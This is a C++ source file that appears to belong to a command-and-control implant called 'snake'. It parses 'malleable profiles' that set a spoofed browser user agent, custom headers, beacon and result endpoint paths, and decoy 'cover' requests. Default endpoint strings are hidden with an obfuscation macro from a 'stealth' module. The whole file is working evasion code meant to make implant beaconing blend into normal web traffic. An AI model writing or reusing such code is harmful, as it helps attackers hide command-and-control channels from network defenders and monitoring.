#include "snake/malleable.hpp"

#include <cstdio>
#include <utility>

#include "snake/stealth.hpp"

namespace snake::malleable {

namespace {

constexpr int kMaxCoverCount = 1000;

std::string trim(const std::string& s) {
    std::size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    std::size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

std::string norm_key(const std::string& k) {
    std::string out;
    out.reserve(k.size());
    for (char c : k) {
        char l = (c >= 'A' && c <= 'Z') ? char(c - 'A' + 'a') : c;
        out.push_back(l == '-' ? '_' : l);
    }
    return out;
}

bool has_crlf(const std::string& s) {
    return s.find('\r') != std::string::npos || s.find('\n') != std::string::npos;
}

bool valid_path(const std::string& v) {
    if (v.empty() || v[0] != '/') return false;
    for (char c : v) {
        unsigned char u = static_cast<unsigned char>(c);
        if (u < 0x21 || u == 0x7f) return false;
    }
    return true;
}

bool valid_header_name(const std::string& n) {
    if (n.empty()) return false;
    for (char c : n) {
        unsigned char u = static_cast<unsigned char>(c);
        if (u <= 0x20 || u >= 0x7f) return false;
        if (c == ':' || c == '(' || c == ')' || c == ',' || c == ';' || c == '<' || c == '>' ||
            c == '@' || c == '\\' || c == '"' || c == '/' || c == '[' || c == ']' || c == '?' ||
            c == '=' || c == '{' || c == '}') {
            return false;
        }
    }
    return true;
}

bool parse_count(const std::string& v, int& out) {
    if (v.empty()) return false;
    long n = 0;
    for (char c : v) {
        if (c < '0' || c > '9') return false;
        n = n * 10 + (c - '0');
        if (n > kMaxCoverCount) return false;
    }
    out = static_cast<int>(n);
    return true;
}

std::string line_label(std::size_t line_no) { return "profile line " + std::to_string(line_no); }

}  // namespace

const std::string& default_user_agent() {
    static const std::string ua =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36";
    return ua;
}

Endpoints default_endpoints() {
    Endpoints e;
    e.ws = SNAKE_OBF("/ws");
    e.beacon = SNAKE_OBF("/api/v1/beacon");
    e.result = SNAKE_OBF("/api/v1/result");
    return e;
}

std::string effective_user_agent(const Profile& p) {
    if (p.enabled && !p.user_agent.empty()) return p.user_agent;
    return default_user_agent();
}

std::vector<Header> effective_headers(const Profile& p) {
    if (!p.enabled) return {};
    return p.headers;
}

Endpoints effective_endpoints(const Profile& p) {
    Endpoints e = default_endpoints();
    if (!p.enabled) return e;
    if (!p.ws_path.empty()) e.ws = p.ws_path;
    if (!p.beacon_path.empty()) e.beacon = p.beacon_path;
    if (!p.result_path.empty()) e.result = p.result_path;
    return e;
}

int effective_cover_count(const Profile& p) {
    if (!p.enabled || p.cover_paths.empty()) return 0;
    return p.cover_count;
}

std::string effective_cover_path(const Profile& p, std::size_t index) {
    if (p.cover_paths.empty()) return "";
    return p.cover_paths[index % p.cover_paths.size()];
}

bool expand_path(const std::string& tmpl, const TemplateVars& vars, std::string& out,
                 std::string& err) {
    std::string res;
    res.reserve(tmpl.size());
    std::size_t i = 0;
    while (i < tmpl.size()) {
        char c = tmpl[i];
        if (c != '{') {
            res.push_back(c);
            ++i;
            continue;
        }
        if (i + 1 >= tmpl.size() || tmpl[i + 1] != '{') {
            err = "path template: stray '{'";
            return false;
        }
        std::size_t close = tmpl.find("}}", i + 2);
        if (close == std::string::npos) {
            err = "path template: unterminated placeholder";
            return false;
        }
        std::string name = tmpl.substr(i + 2, close - (i + 2));
        if (name.empty()) {
            err = "path template: empty placeholder";
            return false;
        }
        const std::string* v = nullptr;
        if (name == "id") {
            v = &vars.id;
        } else if (name == "hostname") {
            v = &vars.hostname;
        } else if (name == "os") {
            v = &vars.os;
        } else if (name == "arch") {
            v = &vars.arch;
        } else if (name == "rand") {
            v = &vars.random_hex;
        } else {
            err = "path template: unknown placeholder '{{" + name + "}}'";
            return false;
        }
        if (v->empty()) {
            err = "path template: placeholder '{{" + name + "}}' has no value";
            return false;
        }
        res += *v;
        i = close + 2;
    }
    out = std::move(res);
    return true;
}

bool profile_parse(const std::string& text, Profile& out, std::string& err) {
    Profile p;
    p.enabled = true;
    std::vector<std::string> single_keys;
    std::vector<std::string> header_names;

    auto single_seen = [&](const std::string& k) {
        for (const std::string& s : single_keys) {
            if (s == k) return true;
        }
        return false;
    };
    auto mark_single = [&](const std::string& k) { single_keys.push_back(k); };

    std::size_t line_no = 0;
    std::size_t pos = 0;
    while (pos <= text.size()) {
        std::size_t nl = text.find('\n', pos);
        std::string raw =
            text.substr(pos, (nl == std::string::npos ? text.size() : nl) - pos);
        pos = (nl == std::string::npos) ? text.size() + 1 : nl + 1;
        ++line_no;
        std::string line = trim(raw);
        if (line.empty() || line[0] == '#') continue;

        std::size_t eq = line.find('=');
        if (eq == std::string::npos) {
            err = line_label(line_no) + ": expected 'key = value'";
            return false;
        }
        std::string key = trim(line.substr(0, eq));
        std::string val = trim(line.substr(eq + 1));
        if (key.empty()) {
            err = line_label(line_no) + ": empty key";
            return false;
        }
        if (val.empty()) {
            err = line_label(line_no) + ": empty value for key '" + key + "'";
            return false;
        }
        if (has_crlf(val)) {
            err = line_label(line_no) + ": value for key '" + key + "' contains a line break";
            return false;
        }

        std::string nk = norm_key(key);
        if (nk.rfind("header.", 0) == 0) {
            std::string hname = trim(key.substr(7));
            if (!valid_header_name(hname)) {
                err = line_label(line_no) + ": invalid header name '" + hname + "'";
                return false;
            }
            std::string hl = norm_key(hname);
            for (const std::string& s : header_names) {
                if (s == hl) {
                    err = line_label(line_no) + ": duplicate header '" + hname + "'";
                    return false;
                }
            }
            header_names.push_back(hl);
            Header h;
            h.name = hname;
            h.value = val;
            p.headers.push_back(std::move(h));
            continue;
        }

        if (nk == "user_agent") {
            if (single_seen(nk)) {
                err = line_label(line_no) + ": duplicate key '" + key + "'";
                return false;
            }
            mark_single(nk);
            p.user_agent = val;
        } else if (nk == "ws_path" || nk == "beacon_path" || nk == "result_path") {
            if (single_seen(nk)) {
                err = line_label(line_no) + ": duplicate key '" + key + "'";
                return false;
            }
            if (!valid_path(val)) {
                err = line_label(line_no) + ": invalid path for key '" + key + "'";
                return false;
            }
            mark_single(nk);
            if (nk == "ws_path") {
                p.ws_path = val;
            } else if (nk == "beacon_path") {
                p.beacon_path = val;
            } else {
                p.result_path = val;
            }
        } else if (nk == "cover_path") {
            if (!valid_path(val)) {
                err = line_label(line_no) + ": invalid path for key '" + key + "'";
                return false;
            }
            p.cover_paths.push_back(val);
        } else if (nk == "cover_count") {
            if (single_seen(nk)) {
                err = line_label(line_no) + ": duplicate key '" + key + "'";
                return false;
            }
            int n = 0;
            if (!parse_count(val, n)) {
                err = line_label(line_no) + ": cover_count must be an integer 0-" +
                      std::to_string(kMaxCoverCount);
                return false;
            }
            mark_single(nk);
            p.cover_count = n;
        } else {
            err = line_label(line_no) + ": unknown key '" + key + "'";
            return false;
        }
    }

    if (p.cover_count > 0 && p.cover_paths.empty()) {
        err = "cover_count set without a cover_path";
        return false;
    }
    if (!p.cover_paths.empty() && p.cover_count == 0) {
        err = "cover_path set without a cover_count";
        return false;
    }

    out = std::move(p);
    return true;
}

bool profile_load(const std::string& path, Profile& out, std::string& err) {
    std::FILE* f = std::fopen(path.c_str(), "rb");
    if (f == nullptr) {
        err = "cannot open profile: " + path;
        return false;
    }
    std::string body;
    char buf[4096];
    std::size_t n = 0;
    while ((n = std::fread(buf, 1, sizeof(buf), f)) > 0) body.append(buf, n);
    bool read_err = std::ferror(f) != 0;
    std::fclose(f);
    if (read_err) {
        err = "cannot read profile: " + path;
        return false;
    }
    if (!profile_parse(body, out, err)) {
        err = path + ": " + err;
        return false;
    }
    return true;
}

std::string profile_summary(const Profile& p) {
    if (!p.enabled) return "disabled";
    std::string s = "ua=" + std::string(p.user_agent.empty() ? "default" : "override");
    s += " headers=" + std::to_string(p.headers.size());
    s += " ws_path=" + (p.ws_path.empty() ? std::string("default") : p.ws_path);
    s += " beacon_path=" + (p.beacon_path.empty() ? std::string("default") : p.beacon_path);
    s += " result_path=" + (p.result_path.empty() ? std::string("default") : p.result_path);
    s += " cover=" + std::to_string(p.cover_count) + "x" +
         (p.cover_paths.empty() ? std::string("none") : p.cover_paths[0]);
    return s;
}

}  // namespace snake::malleable
